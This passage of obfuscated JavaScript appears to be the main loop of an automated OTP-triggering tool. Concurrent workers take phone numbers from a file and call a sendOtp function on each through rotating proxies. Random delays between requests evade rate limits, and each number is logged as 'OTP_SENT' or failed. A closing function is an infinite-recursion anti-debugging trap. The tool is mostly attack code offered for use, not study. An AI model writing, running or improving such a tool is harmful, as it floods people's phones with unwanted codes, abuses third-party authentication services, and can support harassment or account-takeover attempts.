          const v326 = fs.readFileSync(v258, "utf8"),
            v327 = v326.split(/\r?\n/).filter(v328 => v328.trim() !== v325.trim()).join('\x0a');
          fs.writeFileSync(v258, v327);
        }
      } catch (v329) {}
    }
    const v276 = v261 ? Math.min(v259, v261.totalCount) : Math.min(v259, v262.length),
      v277 = [],
      v278 = setInterval(() => v273.render(), 500);
    function fn9(v330) {
      return new Promise(v331 => setTimeout(v331, v330));
    }
    async function fn10(v332) {
      while (true) {
        {
          const v333 = await v274();
          if (!v333) break;
          try {
            const v335 = fn7(),
              v336 = await sendOtp(v333, {
                'onStatus': v338 => v273.setStatus("Worker " + v332 + ':\x20' + v338),
                'proxy': v335,
                'timeout': 0x61a8
              }),
              v337 = "- Number (" + v333 + ')';
            if (v336.success) {
              {
                v273.successful++;
                v273.processed++;
                fn8(v333);
                fs.appendFileSync(v270, v336.phone + "|OTP_SENT\n");
                v273.addLog("Triggered OTP for " + v336.phone, "success", v337);
              }
            } else v273.failed++, v273.processed++, fs.appendFileSync(v271, v333 + '|' + (v336.error || "Failed") + '\x0a'), v273.addLog("Failed on " + v333 + ':\x20' + (v336.error || "Failed"), "error", v337);
          } catch (v339) {
            v273.failed++, v273.processed++, v273.addLog("Fatal error on " + v333 + ':\x20' + v339.message, "error", '');
          }
          const v334 = Math.floor(Math.random() * 3000) + 1500;
          await fn9(v334);
        }
      }
    }
    for (let v340 = 0; v340 < v276; v340++) {
      v277.push(fn10(v340));
    }
    await Promise.all(v277), clearInterval(v278), v273.render(), v273.stop();
  }
  start();
}
function fn2(v341) {
  function fn11(v342) {
    {
      fn11(++v342);
    }
  }
  try {
    {
      if (v341) return fn11;else fn11(0);
    }
  } catch (v343) {}
}